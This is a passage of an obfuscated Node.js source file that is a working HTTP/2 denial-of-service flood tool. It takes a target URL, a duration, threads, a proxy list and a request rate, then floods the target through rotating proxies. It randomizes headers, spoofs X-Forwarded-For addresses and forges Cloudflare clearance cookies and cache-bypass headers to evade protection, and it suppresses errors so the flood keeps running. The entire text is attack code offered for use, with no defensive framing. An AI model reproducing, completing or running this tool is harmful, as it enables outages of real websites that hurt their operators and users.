"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8", "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*", "text/html, application/xhtml+xml, image/jxr, */*", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1", "application/javascript, */*;q=0.8", "text/html, text/plain; q=0.6, */*; q=0.1", "application/graphql, application/json; q=0.8, application/xml; q=0.7", "*/*", "image/*", "image/webp,image/apng", 'text/html', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"];
const lang_header = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", 'bn-IN,bn;q=0.9', "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", "da-DK,da;q=0.9", "de-DE,de;q=0.9", "el-GR,el;q=0.9", "es-ES,es;q=0.9", "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", 'hy-AM,hy;q=0.9', "id-ID,id;q=0.9", "is-IS,is;q=0.9", "it-IT,it;q=0.9", "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", "km-KH,km;q=0.9", "kn-IN,kn;q=0.9", 'ko-KR,ko;q=0.9', "ky-KG,ky;q=0.9", "lo-LA,lo;q=0.9", "lt-LT,lt;q=0.9", "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", "ml-IN,ml;q=0.9", "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", "ms-MY,ms;q=0.9", "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", "nb-NO,nb;q=0.9", "ne-NP,ne;q=0.9", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", 'si-LK,si;q=0.9', "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", 'sq-AL,sq;q=0.9', "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", 'th-TH,th;q=0.9', "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", 'kok-IN,kok;q=0.8', "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", 'nso-ZA,nso;q=0.8', "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", 'sd-Arab-PK,sd;q=0.8', "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", 'yo-NG,yo;q=0.8', "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const country = ['A1', 'A2', 'O1', 'AD', 'AE', 'AF', 'AG', 'AI', 'AL', 'AM', 'AO', 'AQ', 'AR', 'AS', 'AT', 'AU', 'AW', 'AX', 'AZ', 'BA', 'BB', 'BD', 'BE', 'BF', 'BG', 'BH', 'BI', 'BJ', 'BL', 'BM', 'BN', 'BO', 'BQ', 'BR', 'BS', 'BT', 'BV', 'BW', 'BY', 'BZ', 'CA', 'CC', 'CD', 'CF', 'CG', 'CH', 'CI', 'CK', 'CL', 'CM', 'CN', 'CO', 'CR', 'CU', 'CV', 'CW', 'CX', 'CY', 'CZ', 'DE', 'DJ', 'DK', 'DM', 'DO', 'DZ', 'EC', 'EE', 'EG', 'EH', 'ER', 'ES', 'ET', 'FI', 'FJ', 'FK', 'FM', 'FO', 'FR', 'GA', 'GB', 'GD', 'GE', 'GF', 'GG', 'GH', 'GI', 'GL', 'GM', 'GN', 'GP', 'GQ', 'GR', 'GS', 'GT', 'GU', 'GW', 'GY', 'HK', 'HM', 'HN', 'HR', 'HT', 'HU', 'ID', 'IE', 'IL', 'IM', 'IN', 'IO', 'IQ', 'IR', 'IS', 'IT', 'JE', 'JM', 'JO', 'JP', 'KE', 'KG', 'KH', 'KI', 'KM', 'KN', 'KP', 'KR', 'KW', 'KY', 'KZ', 'LA', 'LB', 'LC', 'LI', 'LK', 'LR', 'LS', 'LT', 'LU', 'LV', 'LY', 'MA', 'MC', 'MD', 'ME', 'MF', 'MG', 'MH', 'MK', 'ML', 'MM', 'MN', 'MO', 'MP', 'MQ', 'MR', 'MS', 'MT', 'MU', 'MV', 'MW', 'MX', 'MY', 'MZ', 'NA', 'NC', 'NE', 'NF', 'NG', 'NI', 'NL', 'NO', 'NP', 'NR', 'NU', 'NZ', 'OM', 'PA', 'PE', 'PF', 'PG', 'PH', 'PK', 'PL', 'PM', 'PN', 'PR', 'PS', 'PT', 'PW', 'PY', 'QA', 'RE', 'RO', 'RS', 'RU', 'RW', 'SA', 'SB', 'SC', 'SD', 'SE', 'SG', 'SH', 'SI', 'SJ', 'SK', 'SL', 'SM', 'SN', 'SO', 'SR', 'SS', 'ST', 'SV', 'SX', 'SY', 'SZ', 'TC', 'TD', 'TF', 'TG', 'TH', 'TJ', 'TK', 'TL', 'TM', 'TN', 'TO', 'TR', 'TT', 'TV', 'TW', 'TZ', 'UA', 'UG', 'UM', 'US', 'UY', 'UZ', 'VA', 'VC', 'VE', 'VG', 'VI', 'VN', 'VU', 'WF', 'WS', 'YE', 'YT', 'ZA', 'ZM', 'ZW'];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", '*'];
const sigalgs = ["ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512", "ecdsa_brainpoolP256r1tls13_sha256", "ecdsa_brainpoolP384r1tls13_sha384", "ecdsa_brainpoolP512r1tls13_sha512", "ecdsa_sha1", "ed25519", "ed448", "ecdsa_sha224", "rsa_pkcs1_sha1", "rsa_pss_pss_sha256", "dsa_sha256", "dsa_sha384", "dsa_sha512", "dsa_sha224", "dsa_sha1", "rsa_pss_pss_sha384", "rsa_pkcs1_sha2240", "rsa_pss_pss_sha512", "sm2sig_sm3", "ecdsa_secp521r1_sha512"];
let concu = sigalgs.join(':');
controle_header = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", 'CloudflareError', "ParseError", "ParserError", "TimeoutError", "JSONError", "URLError", "InvalidURL", "ProxyError"];
ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", 'EPROTO', "EAI_AGAIN", "EHOSTDOWN", "ENETRESET", "ENETUNREACH", "ENONET", "ENOTCONN", "ENOTFOUND", 'EAI_NODATA', "EAI_NONAME", "EADDRNOTAVAIL", "EAFNOSUPPORT", "EALREADY", "EBADF", "ECONNABORTED", "EDESTADDRREQ", "EDQUOT", "EFAULT", "EHOSTUNREACH", "EIDRM", 'EILSEQ', "EINPROGRESS", "EINTR", "EINVAL", "EIO", "EISCONN", "EMFILE", "EMLINK", "EMSGSIZE", "ENAMETOOLONG", "ENETDOWN", "ENOBUFS", "ENODEV", 'ENOENT', "ENOMEM", "ENOPROTOOPT", "ENOSPC", "ENOSYS", "ENOTDIR", "ENOTEMPTY", "ENOTSOCK", "EOPNOTSUPP", "EPERM", "EPIPE", "EPROTONOSUPPORT", "ERANGE", "EROFS", "ESHUTDOWN", "ESPIPE", "ESRCH", "ETIME", "ETXTBSY", "EXDEV", "UNKNOWN", "DEPTH_ZERO_SELF_SIGNED_CERT", "UNABLE_TO_VERIFY_LEAF_SIGNATURE", "CERT_HAS_EXPIRED", "CERT_NOT_YET_VALID"];
const headerFunc = {
  'accept'() {
    for (let _0x4e0689 = accept_header.length - 0x1; _0x4e0689 > 0x0; _0x4e0689--) {
      const _0x575f88 = Math.floor(Math.random() * (_0x4e0689 + 0x1));
      [accept_header[_0x4e0689], accept_header[_0x575f88]] = [accept_header[_0x575f88], accept_header[_0x4e0689]];
    }
    return accept_header[Math.floor(Math.random() * accept_header.length)];
  },
  'lang'() {
    for (let _0x96e664 = lang_header.length - 0x1; _0x96e664 > 0x0; _0x96e664--) {
      const _0x3f938a = Math.floor(Math.random() * (_0x96e664 + 0x1));
      [lang_header[_0x96e664], lang_header[_0x3f938a]] = [lang_header[_0x3f938a], lang_header[_0x96e664]];
    }
    return lang_header[Math.floor(Math.random() * lang_header.length)];
  },
  'encoding'() {
    for (let _0x40fa27 = encoding_header.length - 0x1; _0x40fa27 > 0x0; _0x40fa27--) {
      const _0x33a102 = Math.floor(Math.random() * (_0x40fa27 + 0x1));
      [encoding_header[_0x40fa27], encoding_header[_0x33a102]] = [encoding_header[_0x33a102], encoding_header[_0x40fa27]];
    }
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
  },
  'controling'() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
  },
  'cipher'() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  },
  'referers'() {
    for (let _0x1ec6c5 = referer.length - 0x1; _0x1ec6c5 > 0x0; _0x1ec6c5--) {
      const _0x33d9ad = Math.floor(Math.random() * (_0x1ec6c5 + 0x1));
      [referer[_0x1ec6c5], referer[_0x33d9ad]] = [referer[_0x33d9ad], referer[_0x1ec6c5]];
    }
    return referer[Math.floor(Math.random() * referer.length)];
  },
  'platforms'() {
    return platform[Math.floor(Math.random() * platform.length)];
  },
  'mode'() {
    return fetch_mode[Math.floor(Math.random() * fetch_mode.length)];
  },
  'dest'() {
    return fetch_dest[Math.floor(Math.random() * fetch_dest.length)];
  },
  'site'() {
    return fetch_site[Math.floor(Math.random() * fetch_site.length)];
  },
  'countrys'() {
    return country[Math.floor(Math.random() * country.length)];
  },
  'type'() {
    return type[Math.floor(Math.random() * type.length)];
  }
};
function spoof() {
  return '' + randstr.generate({
    'length': 0x1,
    'charset': '12'
  }) + randstr.generate({
    'length': 0x1,
    'charset': "012345"
  }) + randstr.generate({
    'length': 0x1,
    'charset': "012345"
  }) + '.' + randstr.generate({
    'length': 0x1,
    'charset': '12'
  }) + randstr.generate({
    'length': 0x1,
    'charset': "012345"
  }) + randstr.generate({
    'length': 0x1,
    'charset': "012345"
  }) + '.' + randstr.generate({
    'length': 0x1,
    'charset': '12'
  }) + randstr.generate({
    'length': 0x1,
    'charset': "012345"
  }) + randstr.generate({
    'length': 0x1,
    'charset': "012345"
  }) + '.' + randstr.generate({
    'length': 0x1,
    'charset': '12'
  }) + randstr.generate({
    'length': 0x1,
    'charset': "012345"
  }) + randstr.generate({
    'length': 0x1,
    'charset': "012345"
  });
}
function randomByte() {
  let _0x1ac4c8 = new Uint8Array(0x1);
  window.crypto.getRandomValues(_0x1ac4c8);
  return _0x1ac4c8[0x0];
}
function randomIp() {
  let _0x121d72 = [];
  for (let _0x141178 = 0x0; _0x141178 < 0x4; _0x141178++) {
    _0x121d72.push(Math.floor(Math.random() * 0x100));
  }
  return _0x121d72.join('.');
}
process.on('uncaughtException', function (_0x10522f) {
  if (_0x10522f.code && ignoreCodes.includes(_0x10522f.code) || _0x10522f.name && ignoreNames.includes(_0x10522f.name)) {
    return false;
  }
}).on("unhandledRejection", function (_0x1b643a) {
  if (_0x1b643a.code && ignoreCodes.includes(_0x1b643a.code) || _0x1b643a.name && ignoreNames.includes(_0x1b643a.name)) {
    return false;
  }
}).on("warning", _0x25d935 => {
  if (_0x25d935.code && ignoreCodes.includes(_0x25d935.code) || _0x25d935.name && ignoreNames.includes(_0x25d935.name)) {
    return false;
  }
}).setMaxListeners(0x0);
function isPrivate(_0x344aad, _0x55045a) {
  if (!_0x344aad) {
    throw new Error("IP address is required");
  }
  if (!_0x55045a || !Array.isArray(_0x55045a)) {
    _0x55045a = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"];
  }
  const _0x24e0fc = ipaddr.parse(_0x344aad);
  for (let _0x5047cf = 0x0; _0x5047cf < _0x55045a.length; _0x5047cf++) {
    const _0x546f07 = ipaddr.parseCIDR(_0x55045a[_0x5047cf]);
    if (_0x24e0fc.match(_0x546f07)) {
      return true;
    }
  }
  return false;
}
const target = process.argv[0x2];
const time = process.argv[0x3];
const thread = process.argv[0x4];
const proxyFile = process.argv[0x5];
const rps = process.argv[0x6];
if (!target || !time || !thread || !proxyFile || !rps) {
  console.log("  url time thread proxy.txt rate ".rainbow);
  process.exit(0x1);
}
if (!/^https?:\/\//i.test(target)) {
  console.error("sent with http:// or https://");
  process.exit(0x1);
}
let proxys = [];
try {
  const proxyData = fs.readFileSync(proxyFile, "utf-8");
  proxys = proxyData.match(/\S+/g);
} catch (_0x2d4c18) {
  console.error("Error proxy file:", _0x2d4c18.message);
  process.exit(0x1);
}
if (isNaN(rps) || rps <= 0x0) {
  console.error("number rps");
  process.exit(0x1);
}
const proxyr = () => {
  for (let _0x376417 = proxys.length - 0x1; _0x376417 > 0x0; _0x376417--) {
    const _0x255864 = Math.floor(Math.random() * (_0x376417 + 0x1));
    [proxys[_0x376417], proxys[_0x255864]] = [proxys[_0x255864], proxys[_0x376417]];
  }
  return proxys[Math.floor(Math.random() * proxys.length)];
};
if (cluster.isMaster) {
  console.clear();
  console.log("@tcpspoofed".rainbow);
  console.log("..............".yellow);
  for (let _ of Array.from({
    'length': thread
  })) {
    cluster.fork();
  }
  setTimeout(() => process.exit(-0x1), time * 0x3e8);
} else {
  setInterval(flood);
}
function flood() {
  var _0xad5973 = url.parse(target);
  const _0x441f27 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
  var _0x47220f = cplist[Math.floor(Math.random() * cplist.length)];
  var _0x15a757 = proxyr().split(':');
  var _0x314928 = request.jar();
  var _0x38a76e = randomIp();
  var _0x230965 = {
    'Cache-Control': controle_header[Math.floor(Math.random() * controle_header.length)],
    ':method': "GET",
    ':authority': _0xad5973.host,
    'Accept-Encoding': headerFunc.encoding(),
    'X-Forwarded-For': _0x38a76e,
    ':scheme': "https",
    'sec-ch-ua': _0x441f27,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': platform[Math.floor(Math.random() * platform.length)],
    'User-Agent': _0x441f27,
    'upgrade-insecure-requests': '1',
    'sec-fetch-site': fetch_site[Math.floor(Math.random() * fetch_site.length)],
    'sec-fetch-dest': fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
    'sec-fetch-mode': fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
    'accept': headerFunc.accept(),
    'accept-language': headerFunc.lang(),
    ':path': _0xad5973.path,
    'Origin': target,
    'x-access-token': xAuthToken,
    'CF-IPCountry': country[Math.floor(Math.random() * country.length)],
    'Referer': headerFunc.referers(),
    'If-Modified-Since': httpTime,
    'x-requested-with': "XMLHttpRequest",
    'content-type': type[Math.floor(Math.random() * type.length)],
    'cf-cache-status': "BYPASS",
    'sec-ch-ua-platform-version': "0.1.0",
    'Cookie': "cf_clearance=" + encrypted
  };
  const _0x358eff = new http.Agent({
    'keepAlive': true,
    'keepAliveMsecs': 0x7a120,
    'maxSockets': 0xc350,
    'maxTotalSockets': 0x2710
  });
  const _0x3421e4 = {
    'host': _0x15a757[0x0],
    'agent': _0x358eff,
    'port': _0x15a757[0x1],
    'method': "CONNECT",
    'path': _0xad5973.host + ":443",
    'headers': {
      'Host': _0xad5973.host,
      'Proxy-Connection': "Keep-Alive",
      'Connection': "Keep-Alive"
    }
  };
  const _0x34820a = http.request(_0x3421e4, _0xeb3a3d => {});
  _0x34820a.on("connect", function (_0x48f9b7, _0x57138c, _0x3f7ae1) {
    const _0x1f6fcf = tls.connect({
      'host': _0xad5973.host,
      'ciphers': _0x47220f,
      'secureProtocol': ["TLSv1_1_method", "TLSv1_2_method", 'TLSv1_3_method'],
      'followAllRedirects': true,
      'maxRedirects': 0xa,
      'port': 0x1bb,
      'sigals': concu,
      'secureOptions': crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
      'servername': _0xad5973.host,
      'echdCurve': "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
      'secure': true,
      'Compression': false,
      'rejectUnauthorized': false,
      'ALPNProtocols': ['h2', "http/1.1", "spdy/3.1"],
      'sessionTimeout': 0x1388,
      'sessionMaxTimeout': 0xea60,
      'socket': _0x57138c,
      'cookie': _0x314928
    }, () => {
      _0x1f6fcf.setKeepAlive(true, 6000000);
      const _0x1e00f1 = http2.connect(_0xad5973.href, {
        'createConnection': () => _0x1f6fcf,
        'settings': {
          'headerTableSize': 0x10000,
          'maxConcurrentStreams': 0x3e8,
          'initialWindowSize': 0x600000,
          'maxHeaderListSize': 0x40000,
          'enablePush': false
        }
      });
      _0x1e00f1.on("connect", () => {
        const _0x4c22ae = setInterval(() => {
          for (let _0x30386a = 0x0; _0x30386a < rps; _0x30386a++) {
            const _0x566a10 = _0x1e00f1.request(_0x230965).on("response", _0x352147 => {
              _0x566a10.close();
              _0x566a10.destroy();
              return;
            });
            _0x566a10.end();
          }
        }, process.argv[0x7]);
      });
      _0x1e00f1.on("close", () => {
        _0x1e00f1.destroy();
        connection.destroy();
        return;
      });
      _0x1e00f1.on("error", _0x4c090e => {
        _0x1e00f1.destroy();
        connection.destroy();
        return;
      });
    });
  });
  _0x34820a.end();
}